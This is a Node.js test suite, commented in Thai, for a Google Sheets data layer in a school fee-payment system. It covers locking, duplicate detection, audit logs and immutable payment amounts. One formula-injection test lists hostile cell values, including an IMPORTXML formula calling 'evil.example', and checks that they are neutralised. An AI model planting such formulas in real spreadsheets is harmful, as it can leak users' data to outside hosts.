'use strict';
/** ทดสอบชั้นข้อมูล Db.gs กับ Google Sheets จำลอง */
const test = require('node:test');
const assert = require('node:assert/strict');
const { createInstalledEnv, plain } = require('./harness');

const OFFICER = { userId: 'USR-TEST', username: 'finance1', role: 'FINANCE' };
const isCode = (code) => (e) => e && e.name === 'AppError' && e.code === code;

function setup(options) {
  const h = createInstalledEnv(Object.assign({ now: '2026-11-21T10:00:00+07:00' }, options || {}));
  const g = h.gas;
  const write = (fn) => g.withScriptLock_(fn);
  return { h, g, write };
}

function student(no, first, extra) {
  return Object.assign({ StudentNo: no, Prefix: 'ด.ช.', FirstName: first, LastName: 'ใจดี', Status: 'STUDYING' }, extra || {});
}

/** ค่าดิบในชีต ตามชื่อคอลัมน์ */
function rawRow(h, sheetName, rowNumber) {
  const sheet = h.sheet(sheetName);
  const header = sheet._rowValues(1);
  const values = sheet._rowValues(rowNumber);
  return Object.fromEntries(header.map((name, i) => [name, values[i]]));
}

test('เพิ่มแล้วอ่านกลับได้ค่าเดิม: เลขนำหน้าด้วย 0 วันที่ และภาษาไทยไม่เพี้ยน', () => {
  const { h, g, write } = setup();
  const saved = write(() => g.dbInsert_('Students', student('00123', 'สมชาย', { StatusDate: '2026-05-16' }), OFFICER));
  assert.match(saved.StudentId, /^STU-20261121100000-[0-9A-F]{6}$/);
  assert.equal(saved.CreatedBy, 'finance1');
  assert.equal(saved.CreatedAt, '2026-11-21 10:00:00');
  assert.equal(saved.UpdatedAt, '', 'ยังไม่เคยแก้ไข');

  h.newExecution();
  const read = plain(g.dbGet_('Students', saved.StudentId));
  assert.equal(read.StudentNo, '00123');
  assert.equal(read.StatusDate, '2026-05-16');
  assert.equal(read.FirstName, 'สมชาย');

  const raw = rawRow(h, 'Students', 2);
  assert.equal(raw.StudentNo, '00123', 'ในชีตต้องเป็นข้อความ ไม่ถูกแปลงเป็นตัวเลข 123');
  assert.equal(raw.StatusDate, '2026-05-16', 'ในชีตต้องเป็นข้อความ ไม่ถูกแปลงเป็นวันที่');
});

for (const mode of ['consume', 'literal']) {
  test('กันสูตร (formula injection) และอ่านกลับได้ค่าเดิม [โหมด apostrophe: ' + mode + ']', () => {
    const { h, g, write } = setup({ apostropheMode: mode });
    const evil = ['=IMPORTXML("http://evil.example","//a")', '+SUM(1,2)', '-5+3', '@cmd', "'quoted"];
    const ids = write(() => evil.map((name, i) => g.dbInsert_('Students', student('X' + i, name, { StatusNote: name }), OFFICER).StudentId));
    h.newExecution();
    ids.forEach((id, i) => {
      const rec = g.dbGet_('Students', id);
      const expected = evil[i].replace(/^'+/, ''); // ' นำหน้าถูกตัดตั้งแต่ก่อนบันทึก
      assert.equal(rec.FirstName, expected);
      assert.equal(rec.StatusNote, expected);
    });
    const sheet = h.sheet('Students');
    for (let r = 2; r <= sheet.getLastRow(); r++) {
      assert.ok(!sheet._rowValues(r).includes('#FORMULA!'), 'แถว ' + r + ' ถูกตีความเป็นสูตร');
    }
  });
}

test('จำนวนเงินเก็บเป็นทศนิยม 2 ตำแหน่ง และไม่รับทศนิยมเกิน', () => {
  const { h, g, write } = setup();
  const fee = write(() => g.dbInsert_('FeeSettings', {
    AcademicYear: 2569, Term: '1', GradeLevel: 'ป.1', Amount: '1,500.50', StartDate: '2026-05-16', DueDate: '2026-06-30', Status: 'ACTIVE',
  }, OFFICER));
  assert.equal(fee.Amount, 1500.5);
  const raw = rawRow(h, 'FeeSettings', 2);
  assert.equal(raw.Amount, 1500.5);
  assert.equal(typeof raw.Amount, 'number');
  assert.equal(h.sheet('FeeSettings').getRange(2, 5).getNumberFormat(), '#,##0.00');
  assert.throws(() => write(() => g.dbInsert_('FeeSettings', {
    AcademicYear: 2569, Term: '2', GradeLevel: 'ป.1', Amount: 1.005, Status: 'ACTIVE',
  }, OFFICER)), isCode('VALIDATION'));
});

test('การเขียนนอก LockService ถูกปฏิเสธเสมอ', () => {
  const { g } = setup();
  assert.throws(() => g.dbInsert_('Students', student('1', 'ก'), OFFICER), (e) => /LockService/.test(e.message));
  assert.throws(() => g.dbUpdate_('SchoolSettings', 'SCHOOL_NAME', { Value: 'x' }, OFFICER), (e) => /LockService/.test(e.message));
});

test('ปฏิเสธคอลัมน์ที่ไม่มีจริง คอลัมน์ระบบ การกำหนดรหัสเอง และการไม่ระบุผู้ทำรายการ', () => {
  const { g, write } = setup();
  assert.throws(() => write(() => g.dbInsert_('Students', student('1', 'ก', { Firstname: 'พิมพ์ผิด' }), OFFICER)), /ไม่มีคอลัมน์ "Firstname"/);
  assert.throws(() => write(() => g.dbInsert_('Students', student('1', 'ก', { CreatedBy: 'hacker' }), OFFICER)), /ระบบบันทึกเอง/);
  assert.throws(() => write(() => g.dbInsert_('Students', student('1', 'ก', { StudentId: 'STU-X' }), OFFICER)), /ห้ามกำหนด/);
  assert.throws(() => write(() => g.dbInsert_('Students', student('1', 'ก'), null)), /ไม่ได้ระบุผู้ทำรายการ/);
  assert.throws(() => write(() => g.dbInsert_('Students', student('1', 'ก', { constructor: 'x' }), OFFICER)), /ไม่มีคอลัมน์/);
});

test('ค่า enum ต้องอยู่ในรายการ', () => {
  const { g, write } = setup();
  assert.throws(() => write(() => g.dbInsert_('Students', student('1', 'ก', { Status: 'EXPELLED' }), OFFICER)), isCode('VALIDATION'));
});

test('กันข้อมูลซ้ำ: ไม่สนตัวพิมพ์และช่องว่างหัวท้าย ทั้งกับข้อมูลเดิมและภายในชุดเดียวกัน', () => {
  const { g, write } = setup();
  write(() => g.dbInsert_('Students', student('ab-01', 'ก'), OFFICER));
  assert.throws(() => write(() => g.dbInsert_('Students', student(' AB-01 ', 'ข'), OFFICER)),
    (e) => e.code === 'CONFLICT' && e.message === 'เลขประจำตัวนักเรียนนี้มีอยู่ในระบบแล้ว');
  assert.throws(() => write(() => g.dbInsertMany_('Students', [student('n1', 'ก'), student('N1', 'ข')], OFFICER)), isCode('CONFLICT'));
  assert.equal(g.dbAll_('Students').length, 1, 'ชุดที่มีข้อมูลซ้ำต้องไม่ถูกบันทึกเลยแม้แต่แถวเดียว');
});

test('ค่าว่างไม่นับว่าซ้ำ (เช่น ผู้ใช้หลายคนไม่มีอีเมล)', () => {
  const { g, write } = setup();
  const user = (u) => ({ Username: u, DisplayName: u, Role: 'FINANCE', Status: 'ACTIVE', SessionVersion: 1 });
  write(() => g.dbInsertMany_('Users', [user('a'), user('b')], OFFICER));
  assert.equal(g.dbAll_('Users').length, 2);
});

test('กฎห้ามซ้ำที่ยกเว้นสถานะ: สร้างรายการเรียกเก็บใหม่ได้เมื่อรายการเดิมถูกยกเลิก', () => {
  const { g, write } = setup();
  const asm = { StudentId: 'STU-1', EnrollmentId: 'ENR-1', FeeSettingId: 'FEE-1', AcademicYear: 2569, Term: '1', GradeLevel: 'ป.1', Room: '1', GrossAmount: 500, Status: 'ACTIVE' };
  const first = write(() => g.dbInsert_('FeeAssessments', asm, OFFICER));
  assert.throws(() => write(() => g.dbInsert_('FeeAssessments', asm, OFFICER)), isCode('CONFLICT'));
  write(() => g.dbUpdate_('FeeAssessments', first.AssessmentId, { Status: 'CANCELLED', CancelReason: 'สร้างผิด' }, OFFICER, { action: 'CANCEL' }));
  const second = write(() => g.dbInsert_('FeeAssessments', asm, OFFICER));
  assert.notEqual(second.AssessmentId, first.AssessmentId);
  assert.throws(() => write(() => g.dbUpdate_('FeeAssessments', first.AssessmentId, { Status: 'ACTIVE' }, OFFICER)),
    isCode('CONFLICT'), 'นำรายการที่ยกเลิกกลับมาใช้ซ้ำกับรายการใหม่ไม่ได้');
});

test('แก้ไขได้เฉพาะคอลัมน์ที่อนุญาต จำนวนเงินที่บันทึกแล้วแก้ไม่ได้', () => {
  const { g, write } = setup();
  const pay = write(() => g.dbInsert_('Payments', {
    RequestKey: 'REQ-1', StudentId: 'STU-1', PaymentDate: '2026-11-21', Amount: 500, Channel: 'เงินสด',
    ReceiptBookId: 'BOOK-1', ReceiptBookNo: '12', ReceiptNo: 551, ReceiptEntryId: 'RCE-1', ReceivedByName: 'ครูการเงิน', Status: 'ACTIVE',
  }, OFFICER));
  assert.throws(() => write(() => g.dbUpdate_('Payments', pay.PaymentId, { Amount: 400 }, OFFICER)), /แก้ไขไม่ได้หลังบันทึกแล้ว/);
  assert.throws(() => write(() => g.dbUpdate_('Payments', pay.PaymentId, { ReceiptNo: 552 }, OFFICER)), /แก้ไขไม่ได้หลังบันทึกแล้ว/);
  assert.throws(() => write(() => g.dbUpdate_('Payments', pay.PaymentId, { PaymentId: 'x' }, OFFICER)), /แก้ไขไม่ได้/);
  // ส่งค่าเดิมของคอลัมน์ที่แก้ไม่ได้มาด้วยได้ (ไม่ถือว่าแก้)
  const res = write(() => g.dbUpdate_('Payments', pay.PaymentId, { Amount: 500, Status: 'VOIDED', VoidReason: 'เขียนจำนวนเงินผิด' }, OFFICER, { action: 'CANCEL' }));
  assert.deepEqual(plain(res.changed), ['Status', 'VoidReason']);
  assert.equal(res.after.Amount, 500);
  assert.equal(res.after.UpdatedBy, 'finance1');
});

test('การแก้ไขบันทึกเฉพาะค่าที่เปลี่ยนลง AuditLogs (ค่าเดิม/ค่าใหม่) และไม่บันทึกเมื่อไม่มีอะไรเปลี่ยน', () => {
  const { h, g, write } = setup();
  const s = write(() => g.dbInsert_('Students', student('7', 'สมชาย'), OFFICER));
  const auditRowsBefore = h.sheet('AuditLogs').getLastRow();
  write(() => g.dbUpdate_('Students', s.StudentId, { FirstName: 'สมชาย', LastName: 'ใจดี' }, OFFICER));
  assert.equal(h.sheet('AuditLogs').getLastRow(), auditRowsBefore, 'ไม่มีการเปลี่ยนแปลง ต้องไม่บันทึกประวัติ');

  write(() => g.dbUpdate_('Students', s.StudentId, { LastName: 'ใจงาม', Status: 'TRANSFERRED' }, OFFICER, { note: 'ย้ายไปโรงเรียนอื่น' }));
  const log = rawRow(h, 'AuditLogs', h.sheet('AuditLogs').getLastRow());
  assert.equal(log.Action, 'UPDATE');
  assert.equal(log.Entity, 'Students');
  assert.equal(log.EntityId, s.StudentId);
  assert.equal(log.Username, 'finance1');
  assert.equal(log.Role, 'FINANCE');
  assert.equal(log.Note, 'ย้ายไปโรงเรียนอื่น');
  assert.deepEqual(JSON.parse(log.BeforeJson), { LastName: 'ใจดี', Status: 'STUDYING' });
  assert.deepEqual(JSON.parse(log.AfterJson), { LastName: 'ใจงาม', Status: 'TRANSFERRED' });
});

test('ค่าลับไม่ปรากฏใน AuditLogs และคอลัมน์ที่ยกเว้นไม่สร้างประวัติ', () => {
  const { h, g, write } = setup();
  const u = write(() => g.dbInsert_('Users', {
    Username: 'director', DisplayName: 'ผอ.', Role: 'DIRECTOR', Status: 'ACTIVE', PasswordHash: 'v1$1000$salt$SECRETHASH', SessionVersion: 1,
  }, OFFICER));
  write(() => g.dbUpdate_('Users', u.UserId, { PasswordHash: 'v1$1000$salt2$NEWSECRET', MustChangePassword: true }, OFFICER));
  const audit = h.sheet('AuditLogs');
  const all = [];
  for (let r = 2; r <= audit.getLastRow(); r++) all.push(audit._rowValues(r).join('|'));
  const text = all.join('\n');
  assert.doesNotMatch(text, /SECRETHASH|NEWSECRET/);
  assert.match(text, /\[ซ่อน\]/);

  const rows = audit.getLastRow();
  write(() => g.dbUpdate_('Users', u.UserId, { LastLoginAt: '2026-11-21 10:05:00' }, OFFICER));
  assert.equal(audit.getLastRow(), rows, 'เปลี่ยนเฉพาะ LastLoginAt ไม่ต้องบันทึกประวัติ');
  assert.equal(g.dbGet_('Users', u.UserId).LastLoginAt, '2026-11-21 10:05:00');
});

test('หยุดการบันทึกถ้าแถวในชีตถูกย้ายด้วยมือ (กันเขียนผิดแถว)', () => {
  const { h, g, write } = setup();
  const a = write(() => g.dbInsert_('Students', student('A', 'ก'), OFFICER));
  write(() => g.dbInsert_('Students', student('B', 'ข'), OFFICER));
  // อ่านข้อมูลไว้ในหน่วยความจำ แล้วจำลองว่ามีคนจัดเรียงชีตระหว่างนั้น
  g.withScriptLock_(() => {
    g.dbAll_('Students');
    h.sheet('Students')._swapRows(2, 3);
    assert.throws(() => g.dbUpdate_('Students', a.StudentId, { StatusNote: 'x' }, OFFICER), isCode('CONFLICT'));
  });
  h.newExecution();
  assert.equal(g.dbGet_('Students', a.StudentId).StatusNote, '', 'ข้อมูลต้องไม่ถูกเขียนผิดแถว');
});

test('หลังได้ lock จะเห็นข้อมูลล่าสุดที่ผู้ใช้อื่นเพิ่งบันทึก', () => {
  const { h, g, write } = setup();
  write(() => g.dbInsert_('Students', student('S1', 'ก'), OFFICER));
  assert.equal(g.dbAll_('Students').length, 1);
  // จำลองผู้ใช้อีกคน (การทำงานอีกรอบ) เพิ่มเลขประจำตัวเดียวกันลงชีตไปแล้ว
  const other = h.sheet('Students');
  const header = other._rowValues(1);
  const row = header.map((c) => ({ StudentId: 'STU-20261121100001-AAAAAA', StudentNo: 'S2', FirstName: 'ข', Status: 'STUDYING' }[c] || ''));
  other.getRange(3, 1, 1, header.length).setValues([row]);
  assert.throws(() => write(() => g.dbInsert_('Students', student('S2', 'ค'), OFFICER)), isCode('CONFLICT'));
});

test('ชีตเต็ม 1,000 แถว ระบบเพิ่มแถวให้อัตโนมัติ', () => {
  const { g, write } = setup();
  const many = Array.from({ length: 1200 }, (_, i) => student('N' + i, 'นักเรียน' + i));
  write(() => g.dbInsertMany_('Students', many, OFFICER, { action: 'IMPORT' }));
  assert.equal(g.dbAll_('Students').length, 1200);
  assert.equal(g.dbFindOne_('Students', (s) => s.StudentNo === 'N1199').FirstName, 'นักเรียน1199');
});

test('ข้อมูลที่อ่านได้เป็นสำเนา แก้ไขแล้วไม่กระทบข้อมูลในระบบ', () => {
  const { g, write } = setup();
  const s = write(() => g.dbInsert_('Students', student('C1', 'ก'), OFFICER));
  const copy = g.dbGet_('Students', s.StudentId);
  copy.FirstName = 'แก้ในหน่วยความจำ';
  assert.equal(g.dbGet_('Students', s.StudentId).FirstName, 'ก');
  assert.equal(g.dbGet_('Students', 'STU-ไม่มี'), null);
});

test('ข้อมูลเงินในชีตที่ถูกแก้ด้วยมือจนผิดรูปแบบ ระบบแจ้งตำแหน่งชัดเจนแทนการเดาค่า', () => {
  const { h, g, write } = setup();
  write(() => g.dbInsert_('FeeSettings', { AcademicYear: 2569, Term: 'Y', GradeLevel: 'ป.2', Amount: 300, Status: 'ACTIVE' }, OFFICER));
  h.sheet('FeeSettings')._rawSet(2, 5, 'สามร้อย');
  h.newExecution();
  assert.throws(() => g.dbAll_('FeeSettings'), (e) => /ชีต "FeeSettings" แถว 2 คอลัมน์ Amount/.test(e.message));
});

test('ชีตที่ขาดคอลัมน์ แจ้งให้รันการติดตั้งใหม่', () => {
  const { h, g } = setup();
  h.sheet('Students')._rawSet(1, 3, '');
  h.newExecution();
  assert.throws(() => g.dbAll_('Students'), (e) => /ขาดคอลัมน์ Prefix/.test(e.message) && /ติดตั้ง/.test(e.message));
});

test('จองรหัสล่วงหน้า: ใช้กำหนดรหัสเองได้เฉพาะรหัสที่จองไว้กับชีตนั้น และใช้ได้ครั้งเดียว', () => {
  const { g, write } = setup();
  assert.throws(() => g.dbReserveId_('Payments'), /lock/i, 'ต้องถือ lock');
  const result = write(() => {
    const id = g.dbReserveId_('Students');
    assert.match(id, /^STU-\d{14}-[0-9A-F]{6}$/);
    const rec = g.dbInsert_('Students', student('99', 'จอง', { StudentId: id }), OFFICER);
    assert.equal(rec.StudentId, id);
    assert.throws(() => g.dbInsert_('Students', student('98', 'ซ้ำ', { StudentId: id }), OFFICER), /ห้ามกำหนด/, 'ใช้รหัสที่จองแล้วซ้ำไม่ได้');
    const other = g.dbReserveId_('Payments');
    assert.throws(() => g.dbInsert_('Students', student('97', 'ข้ามชีต', { StudentId: other }), OFFICER), /ห้ามกำหนด/);
    return id;
  });
  assert.ok(g.dbGet_('Students', result));
});
